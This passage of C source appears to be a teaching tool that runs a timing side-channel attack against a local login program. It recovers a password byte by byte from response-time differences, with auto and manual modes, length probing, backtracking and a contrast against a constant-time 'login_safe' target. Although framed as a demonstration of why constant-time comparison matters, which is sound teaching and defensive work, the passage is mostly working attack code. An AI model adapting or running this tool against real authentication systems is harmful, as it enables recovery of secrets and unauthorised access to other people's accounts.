    memcpy(a, recovered, k);     a[k] = REF_BYTE;
    for (size_t f = k + 1; f < len; f++) a[f] = '.';
    a[len] = '\0';
    memcpy(b, recovered, k - 1); b[k - 1] = REF_BYTE;
    for (size_t f = k; f < len; f++) b[f] = '.';
    b[len] = '\0';

    double d[MAX_EST];
    int n = 0, want = (int)(est * g_effort);
    if (want < 6) want = 6;
    if (want > MAX_EST) want = MAX_EST;
    for (int i = 0; i < want && !g_stop; i++) {
        uint64_t ma = UINT64_MAX, mb = UINT64_MAX;
        for (int s = 0; s < BURST; s++) {
            uint64_t t;
            if (s & 1) { t = ask(a, NULL); if (t < ma) ma = t;
                         t = ask(b, NULL); if (t < mb) mb = t; }
            else       { t = ask(b, NULL); if (t < mb) mb = t;
                         t = ask(a, NULL); if (t < ma) ma = t; }
        }
        d[n++] = (double)ma - (double)mb;
    }
    if (!n) { if (se_out) *se_out = 0; return 0; }
    double m = dmedian(d, n);
    if (se_out) *se_out = dstderr(d, n, m);
    return m;
}

/* Measure every recovered character this way. step[k] is what matching byte k-1
 * costs: one byte's work if that character is right, nothing if it is not. */
static void measure_steps(const char *recovered, size_t len,
                          double *step, double *se, int est) {
    for (size_t k = 1; k <= len && !g_stop; k++)
        step[k] = verify_char_n(recovered, k, len, &se[k], est);
}

/* The first character that does not pay for itself, or len if they all do. */
static size_t first_bad_step(const double *step, size_t len) {
    for (size_t k = 1; k <= len; k++)
        if (step[k] < signal_floor()) return k - 1;
    return len;
}

static void report_steps(const char *recovered, const double *step,
                         const double *se, size_t len) {
    printf("\n" C_CYAN "Re-checking every character on its own" C_RESET
           "  (each must add one byte's work)\n");
    for (size_t k = 1; k <= len; k++)
        printf("   '%c' at position %2zu   %+7.1f ±%4.1f us   %s\n",
               recovered[k - 1], k - 1, step[k] / 1000.0, se[k] / 1000.0,
               step[k] >= signal_floor() ? C_WIN "matches" C_RESET
                                         : C_YELLOW "does NOT match" C_RESET);
}

/* ── the staircase: the leak in one picture ─────────────────────────────────
 * Run time against number of matching leading bytes, built from the recovered
 * password — all we, the attacker, know. Each step up is one byte of work that
 * the vulnerable compare performed before giving up. */
static void draw_staircase(const double *step, size_t len) {
    printf("\n" C_CYAN "The leak in one picture: work done grows with each matching byte\n" C_RESET
           C_DIM "   (each step is the measured extra cost of matching one more byte)\n" C_RESET);
    double cum[MAXLEN + 1];
    cum[0] = 0;
    for (size_t k = 1; k <= len; k++)
        cum[k] = cum[k - 1] + (step[k] > 0 ? step[k] : 0);
    double hi = cum[len] > 0 ? cum[len] : 1;
    for (size_t k = 0; k <= len; k++) {
        int n = (int)(cum[k] / hi * BAR_WIDTH + 0.5);
        printf("   %2zu bytes match  " C_YELLOW, k);
        for (int i = 0; i < n; i++) fputs("█", stdout);
        for (int i = n; i < BAR_WIDTH; i++) putchar(' ');
        printf("%s  %7.1f us\n", C_RESET, cum[k] / 1000.0);
    }
}

static int submit(const char *recovered, size_t len) {
    char full[MAXLEN];
    memcpy(full, recovered, len);
    full[len] = '\0';
    int granted = 0, any = 0;
    for (int s = 0; s < 3; s++) { ask(full, &granted); any |= granted; }
    return any;
}

/* ── recovery with backtracking ─────────────────────────────────────────────
 * Recover characters from `start` up to `len`. The chain validates itself: if a
 * position comes out FLAT, no character there can add work, which can only mean
 * the check is already failing earlier — so the previous pick was wrong. Undo
 * it, forbid that character and carry on. Returns the position reached. */
static size_t recover_range(char *recovered, size_t len, size_t start) {
    size_t pos = start;
    int retried = 0;                                 /* extra attempts at THIS position */
    int rejected = 0;                                /* picks thrown out at THIS position */
    while (pos < len && !g_stop && !g_dead) {
        recovered[pos] = '\0';                       /* the prefix, as it stands */
        Pick p = race(recovered, pos, len, g_banned[pos], 1.0 + retried);
        if (g_stop || g_dead) break;

        if (p.ch && (p.granted || p.has_signal)) {
            recovered[pos] = p.ch;
            recovered[pos + 1] = '\0';
            draw_pick(&p, pos, recovered, 1);

            /* Winning a race only means "slower than the other 73 candidates".
             * Before building on it, ask the different and much easier question:
             * on its own, does this character actually add a byte's work? A pick
             * that fails that never gets to poison the positions after it — the
             * error is caught here, one position later at worst, instead of
             * surfacing as a denied password twenty characters down the line. */
            if (!p.granted && g_work > 0 && rejected < 2) {
                double se = 0;
                double d = verify_char_n(recovered, pos + 1, len, &se, CONFIRM_EST);
                if (g_stop || g_dead) break;
                if (d + CONFIDENCE * se < CONFIRM_FRAC * g_work) {
                    printf("   " C_YELLOW "-> rejected on re-check: on its own '%c' adds only "
                           "%+.1f ±%.1f us, not the %.1f us a match costs.\n"
                           "      Forbidding it and re-racing this position." C_RESET "\n",
                           p.ch, d / 1000.0, se / 1000.0, g_work / 1000.0);
                    g_banned[pos][(unsigned char)p.ch] = 1;
                    recovered[pos] = '\0';
                    rejected++;
                    g_rechecks++;
                    continue;                        /* same position, one candidate fewer */
                }
                printf("   " C_DIM "   re-checked on its own: %+.1f ±%.1f us — confirmed."
                       C_RESET "\n", d / 1000.0, se / 1000.0);
            }
            pos++;
            retried = 0;
            rejected = 0;
            continue;
        }

        /* flat (or every character here already ruled out) */
        if (p.ch) draw_pick(&p, pos, recovered, 0);

        /* Rewinding is the only destructive move this attack can make: it throws
         * away characters that may well be right. So it takes real proof, and
         * "the reading was unclear" is not proof — on a noisy machine that is by
         * far the likeliest explanation. Anything short of proof buys another
         * attempt at THIS position with a bigger budget instead. */
        if (!p.flat_certain && retried < 2) {
            retried++;
            g_rechecks++;
            printf("   " C_CYAN "-> but that is inconclusive, not proof of nothing. "
                   "Re-racing this position with a bigger budget." C_RESET "\n");
            continue;
        }

        if (pos > 0) {
            /* Ask the previous character directly, and respect the error bar on
             * the answer: only a confidently ZERO reading justifies a rewind. An
             * earlier version compared the number alone and happily rewound on a
             * "+6.3 us" that carried a ±30 us uncertainty. */
            double se = 0;
            double d = verify_char_n(recovered, pos, len, &se, VERIFY_EST * 2);
            if (g_stop || g_dead) break;
            int certainly_bad = (d + CONFIDENCE * se) < signal_floor();
            if (!certainly_bad) {
                if (retried < 3) {
                    retried++;
                    g_rechecks++;
                    printf("   " C_CYAN "-> '%c' at position %zu measures %+.1f ±%.1f us — not "
                           "confidently zero,\n      so the prefix is not proven wrong. "
                           "Re-racing this position instead of unwinding." C_RESET "\n",
                           recovered[pos - 1], pos - 1, d / 1000.0, se / 1000.0);
                    continue;
                }
            } else {
                printf("   " C_DIM "   (confirmed: '%c' at position %zu measures %+.1f ±%.1f us — "
                       "confidently zero, so it never matched.)" C_RESET "\n",
                       recovered[pos - 1], pos - 1, d / 1000.0, se / 1000.0);
            }
        }

        retried = 0;
        if (pos == 0 || g_backtracks >= MAX_BACKTRACKS) {
            if (pos == 0)
                printf("\n" C_YELLOW "   Position 0 shows no timing signal at all. Either this target is "
                       "constant-time\n   (the fix working), or the length is wrong." C_RESET "\n");
            else
                printf("\n" C_YELLOW "   Giving up after %d backtracks." C_RESET "\n", g_backtracks);
            break;
        }
        g_backtracks++;
        pos--;
        rejected = 0;
        memset(g_banned[pos + 1], 0, 256);           /* those bans assumed a wrong prefix */
        printf("   " C_YELLOW "-> rewinding: '%c' at position %zu cannot have been right. "
               "Forbidding it and re-racing that position." C_RESET "\n",
               recovered[pos], pos);
        g_banned[pos][(unsigned char)recovered[pos]] = 1;
        recovered[pos] = '\0';
    }
    return pos;
}

/* Recover, then prove it — and if the proof fails, find the bad character and
 * try again. This is the outer safety net: no matter how a pick went wrong, the
 * target's own granted/denied answer is the final word. */
static void recover_and_prove(char *recovered, size_t len) {
    size_t pos = recover_range(recovered, len, 0);
    if (g_stop || g_dead || pos < len) {
        printf("\n   Recovered before stopping: \"" C_WIN "%s" C_RESET "\"\n", recovered);
        printf("   " C_DIM "%ld guesses sent; %d eliminations, %d rewinds, %d repairs."
               C_RESET "\n\n", g_asks, g_rechecks, g_backtracks, g_repairs);
        return;
    }

    double step[MAXLEN + 1], se[MAXLEN + 1];
    for (int fix = 0; ; fix++) {
        if (submit(recovered, len)) {
            measure_steps(recovered, len, step, se, 10);
            draw_staircase(step, len);
            printf("\n   Recovered guess: \"" C_WIN "%s" C_RESET "\"\n", recovered);
            printf("   %s\n", C_WIN "✓ Access granted — recovered by timing alone, "
                              "never reading the secret." C_RESET);
            printf("   " C_DIM "%ld guesses sent; %d eliminations, %d rewinds, %d repairs."
                   C_RESET "\n\n", g_asks, g_rechecks, g_backtracks, g_repairs);
            return;
        }
        if (fix >= MAX_REPAIRS || g_stop || g_dead) break;

        printf("\n" C_YELLOW "   Denied. One of the characters is wrong — finding which." C_RESET "\n");
        measure_steps(recovered, len, step, se, VERIFY_EST);
        if (g_stop || g_dead) break;
        report_steps(recovered, step, se, len);
        size_t bad = first_bad_step(step, len);
        if (bad >= len) bad = len - 1;    /* every step looked fine, so suspect the last */
        g_repairs++;
        printf("   -> position %zu ('%c') does not pay for itself. Forbidding it and "
               "re-racing from there.\n", bad, recovered[bad]);
        g_banned[bad][(unsigned char)recovered[bad]] = 1;
        for (size_t q = bad + 1; q < len; q++) memset(g_banned[q], 0, 256);
        recovered[bad] = '\0';
        pos = recover_range(recovered, len, bad);
        if (pos < len) break;
    }

    if (!g_stop && !g_dead) {
        measure_steps(recovered, len, step, se, 10);
        draw_staircase(step, len);
    }
    printf("\n   Recovered guess: \"" C_WIN "%s" C_RESET "\"\n", recovered);
    printf("   %s\n", C_YELLOW "✗ Access denied — the timing did not give it all away." C_RESET);
    printf("   " C_DIM "(Against login_safe that is the fix working. Against login it means "
           "this machine is\n    too noisy for a %zu-character secret — try `paranoid`, close "
           "background work, or\n    shorten SECRET in login.c.)" C_RESET "\n", len);
    printf("   " C_DIM "%ld guesses sent; %d eliminations, %d rewinds, %d repairs." C_RESET "\n\n",
           g_asks, g_rechecks, g_backtracks, g_repairs);
}

/* ── auto mode ──────────────────────────────────────────────────────────── */
static int run_auto(const char *target, size_t len) {
    size_t nchars = strlen(CHARSET);
    banner(target, len, nchars, "auto");
    printf("Each position is a RACE: every character is measured against a reference byte,\n"
           "the hopeless are eliminated, and the survivors are measured again — until the\n"
           "leader is three standard errors clear. Bars show " C_WIN "extra work caused" C_RESET
           ", so the\nwinner should stand at one byte's cost and everything else at zero.\n");

    memset(g_banned, 0, sizeof g_banned);
    char recovered[MAXLEN] = {0};

    if (len == 0) {
        /* No length, no attack: every guess is the wrong length, so the target
         * bails before comparing anything and there is nothing to time. Show
         * that rather than inventing a length. */
        printf("\n" C_YELLOW "Without the password length every guess fails the length check first,\n"
               "so there is no per-byte timing to read — there is nothing to attack yet.\n"
               "Re-run with the length to give the attack every advantage, e.g.\n"
               "    ./attack %s auto 24\n"
               "Against a constant-time target it will still find nothing — which is the point."
               C_RESET "\n\n", target);
        return 0;
    }

    calibrate(len);
    recover_and_prove(recovered, len);
    return 0;
}

/* ── manual mode ────────────────────────────────────────────────────────── */
static void manual_help(void) {
    printf("\n" C_CYAN "Manual mode — commands:" C_RESET "\n"
        "   " C_YELLOW "<char>" C_RESET "     time one character at the current position (repeat to compare)\n"
        "   " C_YELLOW "scan" C_RESET "       race ALL characters at this position and rank them\n"
        "   " C_YELLOW "lock <c>" C_RESET "   fix character c here and move to the next position\n"
        "   " C_YELLOW "lock" C_RESET "       fix the best character you've tried here, and advance\n"
        "   " C_YELLOW "try <text>" C_RESET " time an arbitrary full guess (freeform experiment)\n"
        "   " C_YELLOW "check" C_RESET "      re-check every locked character on its own\n"
        "   " C_YELLOW "submit" C_RESET "     send the recovered string as-is; see granted/denied\n"
        "   " C_YELLOW "detect" C_RESET "     (re)probe the password length by timing\n"
        "   " C_YELLOW "len <n>" C_RESET "    set the password length by hand (0 = unknown)\n"
        "   " C_YELLOW "auto" C_RESET "       hand the rest over to the automatic attack\n"
        "   " C_YELLOW "help" C_RESET "       reprint these commands\n"
        "   " C_YELLOW "quit" C_RESET "       exit (type the full word, or press Ctrl-D)\n\n"
        "(A single letter is always a candidate test — so you can safely try 'q'.\n"
        " On a leaky target you need the right length to see a signal: use `detect` or `len`.)\n\n");
}

static void draw_tried(Racer *tried, size_t ntried, size_t pos, const char *recovered) {
    if (ntried == 0) return;
    Racer sorted[128];
    memcpy(sorted, tried, ntried * sizeof(Racer));
    qsort(sorted, ntried, sizeof(Racer), racer_desc);
    printf(C_CYAN "position %zu" C_RESET "  (locked in: \"" C_WIN "%s" C_RESET "\")  "
           "— extra work caused, biggest = most likely:\n", pos, recovered);
    double hi = sorted[0].score > 0 ? sorted[0].score : 1;
    for (size_t i = 0; i < ntried; i++)
        draw_bar(sorted[i].ch, sorted[i].score, sorted[i].se, hi, i == 0);
    printf("\n");
}

static int run_manual(const char *target, size_t len) {
    size_t nchars = strlen(CHARSET);
    banner(target, len, nchars, "manual");
    manual_help();

    char   recovered[MAXLEN] = {0};
    size_t pos = 0;
    Racer  tried[128]; size_t ntried = 0;
    char   line[MAXLEN];

    memset(g_banned, 0, sizeof g_banned);

    for (;;) {
        if (len) printf(C_CYAN "pos %zu/%zu" C_RESET, pos, len);
        else     printf(C_CYAN "pos %zu/?"   C_RESET, pos);
        printf(" [\"" C_WIN "%s" C_RESET "\"] > ", recovered);
        fflush(stdout);
        if (!fgets(line, sizeof line, stdin)) { printf("\n"); break; }   /* Ctrl-D */
        line[strcspn(line, "\n")] = '\0';
        g_stop = 0;                     /* fresh command: clear any earlier Ctrl-C */
        if (line[0] == '\0') continue;

        /* NB: only the full word "quit"/"exit" (or Ctrl-D) leaves — a bare "q" is a
         * valid candidate character to test, so it must NOT be a quit shortcut. */
        if (!strcmp(line, "quit") || !strcmp(line, "exit")) break;
        if (!strcmp(line, "help")) { manual_help(); continue; }

        size_t el = len ? len : pos + 1;            /* length used to build a probe */

        if (!strcmp(line, "detect")) {
            printf("Probing the length by timing (up to %.0f s; Ctrl-C to skip)...\n", DETECT_BUDGET);
            size_t d;
            if (detect_length(&d, DETECT_BUDGET)) {
                len = d; pos = 0; ntried = 0; recovered[0] = '\0';
                printf("   " C_WIN "detected length: %zu" C_RESET " — restarting at position 0.\n", len);
                explain_detection(len);
            } else {
                printf("   " C_YELLOW "undetected — no lone timing outlier at any length "
                       "(the target looks constant-time)." C_RESET "\n\n");
            }
            g_stop = 0;
            continue;
        }

        if (!strncmp(line, "len ", 4)) {
            int v = atoi(line + 4);
            if (v >= 0 && v < MAXLEN) {
                len = (size_t)v; pos = 0; ntried = 0; recovered[0] = '\0';
                if (len) printf("   length set to %zu — restarting at position 0.\n\n", len);
                else     printf("   length set to unknown.\n\n");
            } else printf("   ? length out of range (0..%d).\n\n", MAXLEN - 1);
            continue;
        }

        if (!strcmp(line, "submit")) {
            int granted = submit(recovered, strlen(recovered));
            g_stop = 0;
            printf("   \"%s\"  ->  %s\n\n", recovered,
                   granted ? C_WIN "GRANTED" C_RESET : C_YELLOW "denied" C_RESET);
            continue;
        }

        if (!strcmp(line, "check")) {
            if (!pos) { printf("   nothing locked in yet.\n\n"); continue; }
            double step[MAXLEN + 1], sest[MAXLEN + 1];
            measure_steps(recovered, pos, step, sest, VERIFY_EST);
            report_steps(recovered, step, sest, pos);
            size_t bad = first_bad_step(step, pos);
            g_stop = 0;
            if (bad >= pos) printf("   " C_WIN "every locked character pays for itself." C_RESET "\n\n");
            else            printf("   " C_YELLOW "position %zu ('%c') is wrong — go back and re-race it."
                                   C_RESET "\n\n", bad, recovered[bad]);
            continue;
        }

        if (!strcmp(line, "auto")) {
            if (!len) { printf("   set a length first (`detect` or `len N`).\n\n"); continue; }
            printf("\nHanding over to auto...\n");
            if (g_work <= 0) calibrate(len);
            recovered[pos] = '\0';
            recover_and_prove(recovered, len);
            pos = strlen(recovered);
            g_stop = 0; ntried = 0;
            continue;
        }

        if (!strcmp(line, "scan")) {
            Pick p = race(recovered, pos, el, g_banned[pos], 1.0);
            g_stop = 0;
            draw_pick(&p, pos, recovered, p.has_signal || p.granted);
            ntried = p.ntop;
            memcpy(tried, p.top, ntried * sizeof(Racer));
            continue;
        }

        if (!strncmp(line, "try ", 4)) {
            const char *g = line + 4;
            int granted = 0;
            uint64_t best = UINT64_MAX;
            for (int s = 0; s < 60 && !g_stop; s++) {
                uint64_t t = ask(g, &granted);
                if (t < best) best = t;
            }
            g_stop = 0;
            printf("   \"%s\"  ->  %s   " C_DIM "(%.1f us)" C_RESET "\n\n",
                   g, granted ? C_WIN "granted" C_RESET : C_YELLOW "denied" C_RESET, best / 1000.0);
            continue;
        }

        if (!strcmp(line, "lock") || !strncmp(line, "lock ", 5)) {
            char ch;
            if (line[4] == ' ' && line[5] != '\0') {
                ch = line[5];
            } else if (ntried > 0) {
                Racer s[128];
                memcpy(s, tried, ntried * sizeof(Racer));
                qsort(s, ntried, sizeof(Racer), racer_desc);
                ch = s[0].ch;
            } else {
                printf("   nothing tried yet — test a character or `scan` first.\n\n");
                continue;
            }
            if (pos >= MAXLEN - 1) { printf("   (maximum length reached)\n\n"); continue; }
            recovered[pos] = ch;
            recovered[pos + 1] = '\0';
            printf("   " C_WIN "locked '%c' at position %zu" C_RESET "  ->  \"" C_WIN "%s" C_RESET "\"\n\n",
                   ch, pos, recovered);
            pos++;
            ntried = 0;
            if (len && pos >= len) {
                printf("Reached the detected length — checking the full guess:\n");
                double step[MAXLEN + 1], sest[MAXLEN + 1];
                measure_steps(recovered, len, step, sest, 10);
                draw_staircase(step, len);
                printf("   \"%s\" -> %s\n\n", recovered,
                       submit(recovered, len) ? C_WIN "GRANTED" C_RESET : C_YELLOW "denied" C_RESET);
                printf("(Keep going if you like, `check` to find a bad character, or `quit`.)\n\n");
            }
            continue;
        }

        /* a single character: measure it at the current position */
        if (line[1] == '\0') {
            char ch = line[0];
            double d[MAX_EST]; int n = 0;
            warmup(recovered, pos, el);
            for (int i = 0; i < 16 && !g_stop; i++)
                d[n++] = estimate(recovered, pos, el, ch, BURST, NULL);
            g_stop = 0;
            double m = n ? dmedian(d, n) : 0;
            double se = n ? dstderr(d, n, m) : 0;
            size_t j;
            for (j = 0; j < ntried; j++) if (tried[j].ch == ch) break;
            if (j == ntried) { if (ntried < 128) ntried++; else j = 127; }
            tried[j].ch = ch; tried[j].score = m; tried[j].se = se; tried[j].n = n;
            printf("   '%c' -> %+.1f ±%.1f us of extra work\n", ch, m / 1000.0, se / 1000.0);
            draw_tried(tried, ntried, pos, recovered);
            continue;
        }

        printf("   ? unrecognised. Type `help`.\n\n");
    }

    printf("\nStopped. Recovered so far: \"" C_WIN "%s" C_RESET "\"\n\n", recovered);
    return 0;
}

/* ── entry ──────────────────────────────────────────────────────────────── */
int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);                 /* don't die if the target closes the pipe */
    struct sigaction sa;                      /* Ctrl-C = "stop when I decide", not kill */
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;                 /* restart interrupted reads; we poll g_stop */
    sigaction(SIGINT, &sa, NULL);

    if (argc < 2) {
        fprintf(stderr,
            "usage: %s <target-program> [auto|manual] [length] [fast|careful|paranoid] [nopin]\n"
            "   e.g. %s ./login                 (manual — step through by hand; the DEFAULT)\n"
            "        %s ./login auto            (run the whole recovery automatically)\n"
            "        %s ./login auto paranoid   (same, with the largest sampling budget)\n"
            "        %s ./login_safe            (watch the fix defeat the attack)\n"
            "   The password length is discovered by timing. Give a number to skip\n"
            "   the probe (e.g. `%s ./login 12`). Ctrl-C stops the attack at any time.\n",
            argv[0], argv[0], argv[0], argv[0], argv[0], argv[0]);
        return 2;
    }

    const char *target = argv[1];
    const char *mode   = "manual";  /* default: hand control to the operator (has an `auto` command) */
    size_t len = 0;                 /* 0 = auto-detect */
    for (int i = 2; i < argc; i++) {
        if      (!strcmp(argv[i], "manual"))   mode = "manual";
        else if (!strcmp(argv[i], "auto"))     mode = "auto";
        else if (!strcmp(argv[i], "fast"))     g_effort = 0.5;
        else if (!strcmp(argv[i], "careful"))  g_effort = 1.0;
        else if (!strcmp(argv[i], "paranoid")) g_effort = 2.0;
        else if (!strcmp(argv[i], "nopin"))    g_pin = 0;
        else {
            int v = atoi(argv[i]);
            if (v > 0 && v < MAXLEN) len = (size_t)v;
        }
    }

    /* Both processes inherit this, so neither is the slow one. Needs privilege;
     * failing is fine and common, so it is not reported as an error. */
    setpriority(PRIO_PROCESS, 0, -10);

    spawn_target(target);
    if (g_pin)
        printf(C_DIM "\n[attacker] pinned attacker and target to one CPU — a blocked "
               "ping-pong otherwise\n           lets the clock wander, and that wander is "
               "bigger than the signal.\n           Pass `nopin` to compare." C_RESET "\n");

    if (len == 0) {
        printf("\nProbing the target by timing to discover the password length "
               "(up to %.0f s; Ctrl-C to skip)...\n", DETECT_BUDGET);
        size_t detected;
        if (detect_length(&detected, DETECT_BUDGET)) {
            len = detected;
            printf("   " C_WIN "detected length: %zu" C_RESET
                   "  (change SECRET in login.c to any length — this adapts)\n", len);
            explain_detection(len);
        } else {
            printf("   " C_YELLOW "length undetected — no lone timing outlier within %.0f s.\n"
                   "   Not assuming a length; the target may be constant-time (the fix working)."
                   C_RESET "\n", DETECT_BUDGET);
        }
        g_stop = 0;                 /* a Ctrl-C used to skip the probe shouldn't stop the attack */
    } else {
        printf("\nUsing password length " C_WIN "%zu" C_RESET " (from command line).\n", len);
    }

    int rc = strcmp(mode, "manual") == 0 ? run_manual(target, len)
                                         : run_auto(target, len);
    reap_target();
    return rc;
}
